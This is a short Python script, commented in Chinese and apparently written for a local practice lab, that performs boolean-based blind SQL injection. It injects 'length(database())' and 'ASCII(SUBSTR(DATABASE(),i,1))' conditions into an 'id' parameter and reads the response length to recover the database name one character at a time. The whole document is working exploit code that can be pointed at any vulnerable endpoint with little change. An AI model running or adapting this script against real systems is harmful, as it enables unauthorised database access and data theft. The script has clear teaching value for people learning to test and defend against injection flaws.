# 获取数据库的名字secure_info
import requests

base_url = 'http://192.168.254.147/SQL_injection/low.php?%s&Submit_ID=确认'

def get_db_name(length:int):
    db_name = ""
    content_template = "id=1 and ASCII(SUBSTR(DATABASE(),%d,1))=%d"
    chars = '_$0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'

    for i in range(1, length + 1):
        for char in chars:
            content = content_template % (i, ord(char))
            url = base_url % content
            # print(url)

            response = requests.get(url)
            resLen = len(response.text)
            # 根据返回长度的不同来判断字符正确与否
            # print(resLen)
            if resLen > 300:
                db_name += char
                break
    print(db_name)

def get_db_name_length():
    length = 0
    content_template = "id=1 and length(database())=%d"
    for i in range(1,64):
        content = content_template % i
        url = base_url % content
        # print (url)
        response = requests.get(url)
        resLen = len(response.text)
        # print(resLen)
        if resLen > 300:
            length = i
            break;
    return length

if __name__ == '__main__':
    length = get_db_name_length()
    get_db_name(length)
